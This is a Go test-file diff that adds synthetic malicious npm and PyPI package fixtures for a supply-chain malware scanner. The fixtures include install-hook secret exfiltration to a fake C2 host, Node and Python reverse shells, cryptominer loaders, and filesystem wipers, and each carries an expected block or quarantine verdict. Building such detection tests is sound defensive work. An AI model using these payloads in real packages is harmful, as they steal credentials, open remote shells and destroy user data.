@@ -85,6 +85,76 @@ func TestSyntheticTechniqueCorpus(t *testing.T) {
 			wantBlock: true, // py-setup-execution with network -> critical
 		},
 
+		// ---- static: hardening rules (overnight gap-closure) ----
+		{
+			name: "npm-postinstall-env-stealer", prevalent: "install-hook env/CI-secret stealer (GuardDog npm-serialize-environment)", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x","scripts":{"postinstall":"node collect.js"}}`,
+				"collect.js":   "require('https').request('https://telemetry.fake-c2.example/i',{method:'POST'}).end(JSON.stringify(process.env));",
+			}),
+			wantBlock: true, // install-env-exfil critical (harvest is the postinstall target)
+		},
+		{
+			name: "pypi-env-harvest-module", prevalent: "env exfil in runtime module (GuardDog pypi exfiltrate-sensitive-data)", eco: pypi,
+			tarball: testutil.PyPISdist("x-1.0", map[string]string{
+				"x/telemetry.py": "import os,urllib.request\nurllib.request.urlopen('http://telemetry.fake-c2.example', data=str(dict(os.environ)).encode())\n",
+			}),
+			wantBlock: false, // install-env-exfil high (runtime, not install-time) -> quarantine
+		},
+		{
+			name: "npm-reverse-shell-source", prevalent: "RAT implant in package source (node net+child_process)", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x"}`,
+				"lib/conn.js":  "const s=require('net').connect(4444,'fake-c2.example');require('child_process').spawn('/bin/sh',[],{stdio:[s,s,s]});",
+			}),
+			wantBlock: true, // reverse-shell-source Tier B (socket fd bound to shell stdio)
+		},
+		{
+			name: "pypi-reverse-shell-source", prevalent: "reverse shell in an importable module (socket+dup2+/bin/sh)", eco: pypi,
+			tarball: testutil.PyPISdist("x-1.0", map[string]string{
+				"x/net.py": "import os,socket,subprocess\ns=socket.socket();s.connect(('fake-c2.example',4444))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\n",
+			}),
+			wantBlock: true, // reverse-shell-source Tier B (python dup2->/bin/sh)
+		},
+		{
+			name: "pypi-bundled-miner-config", prevalent: "bundled cryptominer config (stratum pool + wallet)", eco: pypi,
+			tarball: testutil.PyPISdist("x-1.0", map[string]string{
+				"x/miner_config.json": `{"url":"stratum+tcp://pool.fake-miner.example:3333","user":"48FakeWalletDoNotUse","algo":"randomx"}`,
+				"x/__init__.py":       "x = 1\n",
+			}),
+			wantBlock: false, // cryptominer-artifact high -> quarantine
+		},
+		{
+			name: "npm-bundled-xmrig-loader", prevalent: "xmrig loader (miner binary + config tokens)", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x","scripts":{"postinstall":"node run.js"}}`,
+				"run.js":       "const {spawn}=require('child_process');spawn('xmrig',['-o','pool.fake-miner.example:5555','--donate-level','1','--coin','monero']);",
+			}),
+			wantBlock: false, // cryptominer-artifact high -> quarantine
+		},
+		{
+			name: "npm-postinstall-wiper", prevalent: "install-time sabotage / disgruntled-maintainer wiper", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x","scripts":{"postinstall":"rm -rf --no-preserve-root / #wipe"}}`,
+			}),
+			wantBlock: true, // destructive-payload critical (install-hook context)
+		},
+		{
+			name: "protestware-conditional-fs-wipe", prevalent: "protestware / logic-bomb (peacenotwar class)", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x"}`,
+				"index.js":     "if (new Date() > new Date('2030-01-01') && process.env.CI !== 'true') { require('fs').rmSync(require('os').homedir(), { recursive: true, force: true }); }",
+			}),
+			wantBlock: false, // destructive-payload high (general source, date-gated) -> quarantine
+		},
+		{
+			name: "pypi-setup-rmtree-home", prevalent: "sdist install-time destruction", eco: pypi,
+			tarball: testutil.PyPISdist("x-1.0", map[string]string{
+				"setup.py": "import shutil, os\nshutil.rmtree(os.path.expanduser('~'))\nfrom setuptools import setup\nsetup(name='x')",
+			}),
+			wantBlock: true, // destructive-payload critical (setup.py context)
+		},
+
 		// ---- behavioral: runtime techniques (synthetic traces) ----
 		{
 			name: "cloud-metadata-theft", prevalent: "CI/cloud cred theft", eco: npm,
@@ -170,6 +240,15 @@ func TestSyntheticTechniqueCorpus(t *testing.T) {
 			trace: traceJSON(
 				[]behavior.FileOp{{Path: "/root/.npmrc", Read: true}, {Path: "/etc/passwd", Read: true}, {Path: "/etc/shadow", Read: true}},
 				nil, []behavior.Command{{Command: []string{"sh", "-c", "node build.js"}}}, nil),
+		},
+		{
+			// Precision guard for install-env-exfil: reading a SINGLE named env var
+			// next to a network call is ubiquitous benign config and must NOT fire.
+			name: "benign-single-env-var-read", prevalent: "control: dotenv/config lib", eco: npm, benign: true,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"ok"}`,
+				"index.js":     "const mode=process.env.NODE_ENV;fetch('https://api.example/'+mode);module.exports=mode;",
+			}),
 		},
 		{
 			name: "benign-clean-pypi", prevalent: "control", eco: pypi, benign: true,
